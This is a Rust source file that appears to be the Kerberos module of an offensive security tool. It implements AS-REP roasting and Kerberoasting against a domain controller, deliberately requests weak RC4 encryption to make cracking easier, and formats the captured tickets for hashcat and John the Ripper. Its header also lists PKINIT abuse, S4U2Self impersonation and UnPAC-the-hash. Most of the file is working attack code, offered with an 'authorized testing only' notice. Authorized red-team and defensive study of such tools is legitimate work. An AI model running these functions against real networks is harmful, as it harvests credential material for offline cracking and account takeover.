//! Kerberos 5 Protocol Implementation (RFC 4120)
//!
//! Complete from-scratch implementation of Kerberos 5 authentication protocol
//! including advanced attack techniques for authorized security testing.
//!
//! # Features
//!
//! - **Core Protocol**: AS-REQ/AS-REP, TGS-REQ/TGS-REP message handling
//! - **Encryption Types**: RC4-HMAC (etype 23), AES256-CTS-HMAC-SHA1 (etype 18)
//! - **PKINIT**: Certificate-based authentication (RFC 4556)
//! - **S4U Extensions**: S4U2Self user impersonation
//! - **PAC Parsing**: Privilege Attribute Certificate for UnPAC-the-hash
//!
//! # Attack Techniques
//!
//! - **AS-REP Roasting**: Request TGTs for users without pre-auth
//! - **Kerberoasting**: Request service tickets for offline cracking
//! - **PKINIT Abuse**: Shadow Credentials, certificate theft
//! - **S4U2Self**: Impersonate any user as a trusted service
//! - **UnPAC-the-hash**: Extract NT hashes from PAC_CREDENTIAL_INFO
//!
//! # Example
//!
//! ```rust,no_run
//! use redblue::protocols::kerberos::{
//!     AsReq, KdcReqBody, PrincipalName, Realm, NameType,
//!     EncryptionType, KdcOptions, crypto,
//! };
//!
//! // Build AS-REQ for AS-REP roasting (no pre-auth)
//! let cname = PrincipalName::new(NameType::Principal, vec!["victim".into()]);
//! let sname = PrincipalName::new(NameType::SrvInst, vec!["krbtgt".into(), "DOMAIN.COM".into()]);
//! let realm = Realm("DOMAIN.COM".into());
//!
//! let req_body = KdcReqBody {
//!     kdc_options: KdcOptions::default(),
//!     cname: Some(cname),
//!     realm: realm.clone(),
//!     sname: Some(sname),
//!     from: None,
//!     till: Default::default(),
//!     rtime: None,
//!     nonce: 12345678,
//!     etype: vec![EncryptionType::Rc4Hmac, EncryptionType::Aes256CtsHmacSha1],
//!     addresses: None,
//!     enc_authorization_data: None,
//!     additional_tickets: None,
//! };
//!
//! let as_req = AsReq {
//!     pvno: 5,
//!     msg_type: redblue::protocols::kerberos::MessageType::AsReq,
//!     padata: vec![], // No pre-auth for roasting
//!     req_body,
//! };
//!
//! // Encode and send to KDC port 88
//! let encoded = as_req.encode();
//! ```
//!
//! # Security Notice
//!
//! This module is for **authorized security testing only**. Unauthorized use
//! against systems you don't own or have permission to test is illegal.

pub mod crypto;
pub mod pkinit;
pub mod s4u;
pub mod types;

// Re-export core types
pub use types::{
  AddressType,
  ApOptions,
  ApRep,
  ApReq,
  AsRep,
  AsReq,
  Authenticator,
  Checksum,
  ChecksumType,
  // Encoding trait
  DerEncodable,
  EncryptedData,
  EncryptionKey,
  // Encryption
  EncryptionType,
  ErrorCode,
  HostAddress,
  // Flags
  KdcOptions,
  KdcRep,
  KdcReqBody,
  // Time
  KerberosTime,
  // Errors
  KrbError,
  // Messages
  MessageType,
  NameType,
  // Pre-authentication
  PaData,
  PaDataType,
  // Names and realms
  PrincipalName,
  Realm,
  TgsRep,
  TgsReq,
  // Tickets
  Ticket,
  TicketFlags,
};

// Re-export crypto functions
pub use crypto::{decrypt, encrypt, string_to_key, KeyUsage};

// Re-export PKINIT
pub use pkinit::{AuthPack, PaPkAsRep, PaPkAsReq, PkAuthenticator, PkinitClient};

// Re-export S4U
pub use s4u::{PaForUser, Pac, PacBuffer, PacBufferType, S4U2SelfClient};

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

/// Kerberos client for interacting with KDC
pub struct KerberosClient {
  /// KDC hostname or IP
  kdc_host: String,
  /// KDC port (default 88)
  kdc_port: u16,
  /// Connection timeout
  timeout: Duration,
  /// Realm
  realm: Realm,
}

impl KerberosClient {
  /// Create a new Kerberos client
  pub fn new(kdc_host: &str, realm: &str) -> Self {
    Self {
      kdc_host: kdc_host.to_string(),
      kdc_port: 88,
      realm: Realm(realm.to_string()),
      timeout: Duration::from_secs(10),
    }
  }

  /// Set KDC port
  pub fn with_port(mut self, port: u16) -> Self {
    self.kdc_port = port;
    self
  }

  /// Set connection timeout
  pub fn with_timeout(mut self, timeout: Duration) -> Self {
    self.timeout = timeout;
    self
  }

  /// Get the realm
  pub fn realm(&self) -> &Realm {
    &self.realm
  }

  /// Send AS-REQ and receive AS-REP (or error)
  pub fn send_as_req(&self, req: &AsReq) -> Result<AsRep, KerberosError> {
    let response = self.send_message(&req.encode())?;

    // Check if it's an error response
    if response.len() >= 2 {
      // Check for KRB-ERROR (application tag 30)
      let tag = if response[0] == 0x7e {
        30 // Error
      } else if response[0] == 0x6b {
        11 // AS-REP
      } else {
        return Err(KerberosError::Protocol("Unknown response type".into()));
      };

      if tag == 30 {
        let err = KrbError::decode(&response).map_err(|e| KerberosError::Decode(e))?;
        return Err(KerberosError::Krb(err));
      }
    }

    AsRep::decode(&response).map_err(|e| KerberosError::Decode(e))
  }

  /// Send TGS-REQ and receive TGS-REP (or error)
  pub fn send_tgs_req(&self, req: &TgsReq) -> Result<TgsRep, KerberosError> {
    let response = self.send_message(&req.encode())?;

    // Check if it's an error response
    if response.len() >= 2 && response[0] == 0x7e {
      let err = KrbError::decode(&response).map_err(|e| KerberosError::Decode(e))?;
      return Err(KerberosError::Krb(err));
    }

    TgsRep::decode(&response).map_err(|e| KerberosError::Decode(e))
  }

  /// AS-REP Roasting: Request TGT without pre-authentication
  ///
  /// Targets accounts with "Do not require Kerberos preauthentication" set.
  /// Returns encrypted data that can be cracked offline.
  pub fn asrep_roast(&self, username: &str) -> Result<RoastResult, KerberosError> {
    let cname = PrincipalName::new(NameType::Principal, vec![username.to_string()]);
    let sname = PrincipalName::new(
      NameType::SrvInst,
      vec!["krbtgt".to_string(), self.realm.0.clone()],
    );

    let nonce = generate_nonce();

    let req_body = KdcReqBody {
      kdc_options: KdcOptions::default(),
      cname: Some(cname.clone()),
      realm: self.realm.clone(),
      sname: Some(sname),
      from: None,
      till: KerberosTime::from_unix(0x7fffffff), // Max time
      rtime: None,
      nonce,
      etype: vec![
        EncryptionType::Aes256CtsHmacSha1,
        EncryptionType::Aes128CtsHmacSha1,
        EncryptionType::Rc4Hmac,
      ],
      addresses: None,
      enc_authorization_data: None,
      additional_tickets: None,
    };

    let as_req = AsReq {
      pvno: 5,
      msg_type: MessageType::AsReq,
      padata: vec![], // No pre-auth
      req_body,
    };

    match self.send_as_req(&as_req) {
      Ok(as_rep) => {
        // Success! User has pre-auth disabled
        Ok(RoastResult {
          username: username.to_string(),
          realm: self.realm.0.clone(),
          etype: as_rep.enc_part.etype,
          cipher: as_rep.enc_part.cipher.clone(),
          roast_type: RoastType::AsRep,
        })
      }
      Err(KerberosError::Krb(err)) => {
        // KDC error codes as i32 (RFC 4120)
        const KDC_ERR_PREAUTH_REQUIRED: i32 = 25;
        const KDC_ERR_C_PRINCIPAL_UNKNOWN: i32 = 6;

        match err.error_code {
          KDC_ERR_PREAUTH_REQUIRED => Err(KerberosError::PreAuthRequired),
          KDC_ERR_C_PRINCIPAL_UNKNOWN => Err(KerberosError::UserNotFound(username.to_string())),
          _ => Err(KerberosError::Krb(err)),
        }
      }
      Err(e) => Err(e),
    }
  }

  /// Kerberoasting: Request service ticket for offline cracking
  ///
  /// Requires a valid TGT. Returns encrypted service ticket.
  pub fn kerberoast(
    &self,
    tgt: &Ticket,
    session_key: &EncryptionKey,
    spn: &str,
  ) -> Result<RoastResult, KerberosError> {
    // Parse SPN (service/host@REALM or service/host)
    let (service, host) = parse_spn(spn)?;

    let sname = PrincipalName::new(
      NameType::SrvInst,
      vec![service.to_string(), host.to_string()],
    );

    let nonce = generate_nonce();

    // Build TGS-REQ
    let req_body = KdcReqBody {
      kdc_options: KdcOptions::default(),
      cname: None, // Taken from authenticator
      realm: self.realm.clone(),
      sname: Some(sname),
      from: None,
      till: KerberosTime::from_unix(0x7fffffff),
      rtime: None,
      nonce,
      etype: vec![
        EncryptionType::Rc4Hmac, // Prefer RC4 for easier cracking
        EncryptionType::Aes128CtsHmacSha1,
        EncryptionType::Aes256CtsHmacSha1,
      ],
      addresses: None,
      enc_authorization_data: None,
      additional_tickets: None,
    };

    // Build authenticator
    let now = KerberosTime::now();
    let authenticator = Authenticator {
      authenticator_vno: 5,
      crealm: self.realm.clone(),
      cname: PrincipalName::new(NameType::Principal, vec!["user".into()]),
      cksum: None,
      cusec: 0,
      ctime: now,
      subkey: None,
      seq_number: None,
      authorization_data: None,
    };

    // Encrypt authenticator with session key
    let enc_authenticator = encrypt(
      session_key,
      KeyUsage::TgsReqAuthenticator,
      &authenticator.encode(),
    )
    .map_err(|e| KerberosError::Crypto(e))?;

    // Build AP-REQ for TGS-REQ padata
    let ap_req = ApReq {
      pvno: 5,
      msg_type: MessageType::ApReq,
      ap_options: ApOptions::default(),
      ticket: tgt.clone(),
      authenticator: enc_authenticator,
    };

    let pa_tgs_req = PaData {
      padata_type: PaDataType::TgsReq,
      padata_value: ap_req.encode(),
    };

    let tgs_req = TgsReq {
      pvno: 5,
      msg_type: MessageType::TgsReq,
      padata: vec![pa_tgs_req],
      req_body,
    };

    match self.send_tgs_req(&tgs_req) {
      Ok(tgs_rep) => Ok(RoastResult {
        username: spn.to_string(),
        realm: self.realm.0.clone(),
        etype: tgs_rep.ticket.enc_part.etype,
        cipher: tgs_rep.ticket.enc_part.cipher.clone(),
        roast_type: RoastType::Tgs,
      }),
      Err(e) => Err(e),
    }
  }

  /// Send raw message to KDC using TCP
  fn send_message(&self, data: &[u8]) -> Result<Vec<u8>, KerberosError> {
    let addr = format!("{}:{}", self.kdc_host, self.kdc_port);

    let mut stream =
      TcpStream::connect(&addr).map_err(|e| KerberosError::Network(e.to_string()))?;

    stream
      .set_read_timeout(Some(self.timeout))
      .map_err(|e| KerberosError::Network(e.to_string()))?;
    stream
      .set_write_timeout(Some(self.timeout))
      .map_err(|e| KerberosError::Network(e.to_string()))?;

    // TCP Kerberos uses 4-byte length prefix
    let len = data.len() as u32;
    let mut message = Vec::with_capacity(4 + data.len());
    message.extend_from_slice(&len.to_be_bytes());
    message.extend_from_slice(data);

    stream
      .write_all(&message)
      .map_err(|e| KerberosError::Network(e.to_string()))?;
    stream
      .flush()
      .map_err(|e| KerberosError::Network(e.to_string()))?;

    // Read response length
    let mut len_buf = [0u8; 4];
    stream
      .read_exact(&mut len_buf)
      .map_err(|e| KerberosError::Network(e.to_string()))?;

    let response_len = u32::from_be_bytes(len_buf) as usize;

    // Sanity check
    if response_len > 1024 * 1024 {
      return Err(KerberosError::Protocol("Response too large".into()));
    }

    // Read response
    let mut response = vec![0u8; response_len];
    stream
      .read_exact(&mut response)
      .map_err(|e| KerberosError::Network(e.to_string()))?;

    Ok(response)
  }
}

/// Result of a roasting attack
#[derive(Debug, Clone)]
pub struct RoastResult {
  /// Username or SPN
  pub username: String,
  /// Realm
  pub realm: String,
  /// Encryption type used
  pub etype: EncryptionType,
  /// Encrypted data to crack
  pub cipher: Vec<u8>,
  /// Type of roast
  pub roast_type: RoastType,
}

impl RoastResult {
  /// Format for hashcat
  pub fn to_hashcat(&self) -> String {
    match self.roast_type {
      RoastType::AsRep => {
        // $krb5asrep$23$user@domain:cipher
        let cipher_b64 = base64_encode(&self.cipher);
        format!(
          "$krb5asrep${}${}@{}:{}",
          self.etype as u32, self.username, self.realm, cipher_b64
        )
      }
      RoastType::Tgs => {
        // $krb5tgs$23$*user$domain$spn*$cipher
        let cipher_b64 = base64_encode(&self.cipher);
        format!(
          "$krb5tgs${}$*{}${}${}*${}",
          self.etype as u32, self.username, self.realm, self.username, cipher_b64
        )
      }
    }
  }

  /// Format for john the ripper
  pub fn to_john(&self) -> String {
    // Similar format, john auto-detects
    self.to_hashcat()
  }
}

/// Type of roasting attack
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RoastType {
  /// AS-REP roasting (accounts without pre-auth)
  AsRep,
  /// TGS roasting (Kerberoasting)
  Tgs,
}

/// Kerberos-specific errors
#[derive(Debug)]
pub enum KerberosError {
  /// Network error
  Network(String),
  /// Protocol error
  Protocol(String),
  /// Kerberos error from KDC
  Krb(KrbError),
  /// Decoding error
  Decode(String),
  /// Crypto error
  Crypto(String),
  /// Pre-authentication required
  PreAuthRequired,
  /// User not found
  UserNotFound(String),
}

impl std::fmt::Display for KerberosError {
  fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
    match self {
      Self::Network(e) => write!(f, "Network error: {}", e),
      Self::Protocol(e) => write!(f, "Protocol error: {}", e),
      Self::Krb(e) => write!(f, "Kerberos error: {:?}", e.error_code),
      Self::Decode(e) => write!(f, "Decode error: {}", e),
      Self::Crypto(e) => write!(f, "Crypto error: {}", e),
      Self::PreAuthRequired => write!(f, "Pre-authentication required"),
      Self::UserNotFound(u) => write!(f, "User not found: {}", u),
    }
  }
}

impl std::error::Error for KerberosError {}

/// Generate random nonce
fn generate_nonce() -> u32 {
  use std::time::{SystemTime, UNIX_EPOCH};
  let nanos = SystemTime::now()
    .duration_since(UNIX_EPOCH)
    .unwrap_or_default()
    .as_nanos();
  (nanos & 0x7FFFFFFF) as u32
}

/// Parse SPN string
fn parse_spn(spn: &str) -> Result<(&str, &str), KerberosError> {
  // Remove @REALM if present
  let spn = spn.split('@').next().unwrap_or(spn);

  let parts: Vec<&str> = spn.split('/').collect();
  if parts.len() != 2 {
    return Err(KerberosError::Protocol(format!(
      "Invalid SPN format: {}",
      spn
    )));
  }
  Ok((parts[0], parts[1]))
}

/// Simple base64 encoding
fn base64_encode(data: &[u8]) -> String {
  const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

  let mut result = String::new();
  let mut i = 0;

  while i < data.len() {
    let b0 = data[i];
    let b1 = if i + 1 < data.len() { data[i + 1] } else { 0 };
    let b2 = if i + 2 < data.len() { data[i + 2] } else { 0 };

    result.push(ALPHABET[(b0 >> 2) as usize] as char);
    result.push(ALPHABET[(((b0 & 0x03) << 4) | (b1 >> 4)) as usize] as char);

    if i + 1 < data.len() {
      result.push(ALPHABET[(((b1 & 0x0f) << 2) | (b2 >> 6)) as usize] as char);
    } else {
      result.push('=');
    }

    if i + 2 < data.len() {
      result.push(ALPHABET[(b2 & 0x3f) as usize] as char);
    } else {
      result.push('=');
    }

    i += 3;
  }

  result
}

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_spn_parsing() {
    let (service, host) = parse_spn("HTTP/web.domain.com").unwrap();
    assert_eq!(service, "HTTP");
    assert_eq!(host, "web.domain.com");

    let (service, host) = parse_spn("MSSQLSvc/db.domain.com@DOMAIN.COM").unwrap();
    assert_eq!(service, "MSSQLSvc");
    assert_eq!(host, "db.domain.com");
  }

  #[test]
  fn test_roast_result_format() {
    let result = RoastResult {
      username: "victim".to_string(),
      realm: "DOMAIN.COM".to_string(),
      etype: EncryptionType::Rc4Hmac,
      cipher: vec![0x41, 0x42, 0x43],
      roast_type: RoastType::AsRep,
    };

    let hashcat = result.to_hashcat();
    assert!(hashcat.starts_with("$krb5asrep$23$"));
    assert!(hashcat.contains("victim@DOMAIN.COM"));
  }

  #[test]
  fn test_base64_encode() {
    assert_eq!(base64_encode(b"Hello"), "SGVsbG8=");
    assert_eq!(base64_encode(b"Hi"), "SGk=");
    assert_eq!(base64_encode(b"A"), "QQ==");
  }
}
